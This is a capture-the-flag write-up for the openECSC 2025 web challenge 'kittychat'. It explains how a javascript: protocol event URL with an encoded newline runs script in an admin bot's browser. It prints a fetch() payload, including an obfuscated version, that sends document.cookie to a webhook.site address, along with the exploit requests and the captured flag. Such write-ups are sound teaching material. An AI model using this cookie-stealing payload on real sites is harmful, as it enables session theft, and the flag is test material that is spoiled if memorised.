# openECSC 2025

## Challenge: kittychat

## Tags: web

## Difficulty: Medium

## Table of Contents

- [Solution Overview](#solution-overview)
- [Tools Used](#tools-used)
- [Solution](#solution)
- [Solution Script](#solution-script)
- [Flag](#flag)

### Solution Overview

EventHub lets users create events with arbitrary URLs (protocol + domain + path) that auto-redirect on the event page. The admin bot visits reported URLs on `http://127.0.0.1/` with a non-HttpOnly cookie containing the flag. By creating an event with `protocol=javascript` and injecting a percent-encoded newline (`%0a`) in the path, I break out of the `javascript://` comment and execute arbitrary JavaScript in the admin's browser context. This allows me to exfiltrate `document.cookie` to a webhook, capturing the flag. The exploit abuses browser URL decoding behavior where `%0a` becomes a real newline before the `javascript:` URL is interpreted.

### Tools Used

- Python 3 with `requests` library
- [webhook.site](https://webhook.site) for flag exfiltration
- Browser DevTools for debugging

### Solution

When I first opened the challenge, I saw a simple event management app. Users can:
- Create events with a name, protocol, domain, and path
- View event details at `/event/<id>`
- Report URLs to an admin bot

The event detail page caught my attention immediately—it has an auto-redirect feature:

```html
<script>
  if (new URLSearchParams(window.location.search).get("auto_redir") === "1") {
    window.location = "{{ event_url.to_url() }}";
  }
</script>
```

**First thought**: "If I control `event_url`, can I make this redirect somewhere malicious?"

#### Finding the Pieces

##### Piece 1: The Admin Cookie

Looking at `main.py`, the admin bot does something interesting:

```python
driver.add_cookie({"name": "admin", "value": FLAG, "httpOnly": False})
```

**Aha!** The flag is in a cookie that's **not HttpOnly**, meaning JavaScript can read it. If I can execute JS in the admin's context, I win.

##### Piece 2: The Report Restriction

The `/report` endpoint only accepts URLs starting with `http://127.0.0.1/`:

```python
if not url.startswith("http://127.0.0.1/"):
    return "Invalid URL", 400
```

So I need to make my payload work via a URL on the same origin as the admin's cookie.

### Piece 3: The URL Construction

When creating an event, the app stores `protocol`, `domain`, and `path` separately. The URL is reconstructed as:

```python
f"{protocol}://{domain}{path}"
```

**Key observation**: There's NO validation on what `protocol` can be! It just lowercases it. What if I use `javascript` as the protocol?

#### The Exploit Chain

Here's my thought process:

1. **"Can I use `javascript:` URLs?"**  
   Yes! The app accepts any protocol. So I can create: `javascript://something`

2. **"But wait, `javascript://` makes everything a comment..."**  
   Right. In `javascript://alert(1)`, everything after `//` is a comment. The code won't execute.

3. **"How do I break out of the comment?"**  
   Comments in JavaScript only go to the end of the line. If I inject a **newline**, the next line will execute!

4. **"Can I inject a newline in the URL?"**  
   Yes! I can use `%0a` (URL-encoded newline) in the `path` field. Browsers decode this **before** interpreting the `javascript:` URL.

5. **"So the final payload would be..."**  
   `javascript://ignored%0afetch("https://webhook.site/...?c=" + document.cookie)`

When the browser decodes `%0a` → newline → the `fetch()` runs!

#### Weaponizing the Exploit

I needed to exfiltrate the cookie to my webhook. Here's the JavaScript payload:

```javascript
fetch("https://webhook.site/8b78691f-3d1f-4ca1-bcaa-0bcb344a8508?c=" + encodeURIComponent(document.cookie))
```

To avoid WAF issues or detection, I obfuscated the webhook URL using `String.fromCharCode()`:

```javascript
fetch(String.fromCharCode(104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,56,98,55,56,54,57,49,102,45,51,100,49,102,45,52,99,97,49,45,98,99,97,97,45,48,98,99,98,51,52,52,97,56,53,48,56,63,99,61).concat(encodeURIComponent(document.cookie)))
```

*(Not strictly necessary, but felt cool 😎)*

#### Putting It All Together

##### Step 1: Create the Malicious Event

I sent this POST request to `/event`:

```
POST /event HTTP/1.1
Content-Type: application/x-www-form-urlencoded

name=x&protocol=javascript&domain=x&path=%0afetch(String.fromCharCode(104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,56,98,55,56,54,57,49,102,45,51,100,49,102,45,52,99,97,49,45,98,99,97,97,45,48,98,99,98,51,52,52,97,56,53,48,56,63,99,61).concat(encodeURIComponent(document.cookie)))
```

This creates an event with URL:  
`javascript://x%0afetch(...)`

The app returned: `Location: /event/<id>`

##### Step 2: Trigger the Admin Bot

I reported this URL to the admin:

```
POST /report HTTP/1.1
Content-Type: application/x-www-form-urlencoded

url=http://127.0.0.1/event/<id>?auto_redir=1
```

When the admin visits, the page auto-redirects to our `javascript:` URL, the browser decodes `%0a`, the newline breaks the comment, and our `fetch()` executes—sending the cookie to my webhook!

##### Step 3: Capture the Flag

Checking my webhook, I received:

```
GET /?c=admin%3DopenECSC%7Bi_hate_browser_differentials_%F0%9F%A4%AE_202c574bc2f5%7D
```

Decoding: `admin=openECSC{i_hate_browser_differentials_🤮_202c574bc2f5}`

**Flag captured!**

### Solution Script

[exploit.py](exploit.py)

### Flag

**Flag**: `openECSC{i_hate_browser_differentials_🤮_202c574bc2f5}`
